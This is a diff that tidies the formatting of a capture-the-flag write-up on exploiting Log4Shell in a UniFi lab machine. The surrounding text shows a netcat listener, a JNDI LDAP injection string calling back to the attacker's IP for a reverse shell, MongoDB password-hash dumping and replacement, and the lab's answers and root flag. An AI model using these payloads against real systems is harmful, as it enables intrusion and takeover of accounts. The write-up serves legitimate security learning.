@@ -44,7 +44,7 @@ Hint : Look for UniFi vulnerabilities in 2021
 
 1. We can just read the details of CVE that we found [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
 
-**Answer: LDAP ** 
+**Answer: LDAP** 
 
 ## What tool do we use to intercept the traffic, indicating the attack was successful?
 
@@ -88,8 +88,8 @@ open new terminal netcat listener
 
 ```nc -lvp 4444```
 
-Go back to burp and edit the remmber 
-${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
+Go back to burp and edit the remember 
+`${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}`
 
 
 
@@ -132,13 +132,13 @@ now let's upgrade it into a bash shell
 
 ![Screenshot 2024-03-15 at 10 56 56 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/452d21ea-a394-4545-84f2-d2bfd3672a5b)
 
-**Answer: ace ** 
+**Answer: ace** 
 
 ## What is the function we use to enumerate users within the database in MongoDB?
 
 *Hint: Search for "find items in mongo" in Google*
 
-1. Upon our google search we find ```db.admin.find()**
+1. Upon our google search we find `db.admin.find()`
 
 **Answer: db.admin.find()**
 
@@ -150,7 +150,7 @@ now let's upgrade it into a bash shell
 
 ## What is the password for the root user?
 
-1. Now we have access to mongodb let's enumerate all the users in the unify's ace database to see if there an interesting user. the forEach here beautifies the output to a readable json.
+1. Now we have access to mongodb let's enumerate all the users in the unify's ace database to see if there an interesting user. The `forEach` here beautifies the output to a readable json.
 ```bash
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 ```
@@ -164,7 +164,7 @@ db.admin.find().forEach(printjson);
 ![Screenshot 2024-03-15 at 11 39 29 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a03cd21f-9382-4171-928d-aac68efca37e)
 
 2. We have found a hash in the key `x_shadow` which represents the password `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.` 
-3. From the hash the value $6$ gives away that sha-512 There is no quick way or tools to crack this hash. So we can attempt to create our own and update the administrator's password.
+3. From the hash the value $6$ gives away that it is sha-512. There is no quick way or tools to crack this hash. So we can attempt to create our own and update the administrator's password.
 4. Let's create our own hash
    ```bash
    mkpasswd -m sha-512 Password1234
@@ -229,7 +229,7 @@ find -type f -name "root.txt"
 
 ![Screenshot 2024-03-16 at 12 19 48 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e012ab61-90a1-41ca-82ea-c125e381fe6d)
 
-**Answer: e50bc93c75b634e4b272d2f771c33681 **
+**Answer: e50bc93c75b634e4b272d2f771c33681**
    
 
 
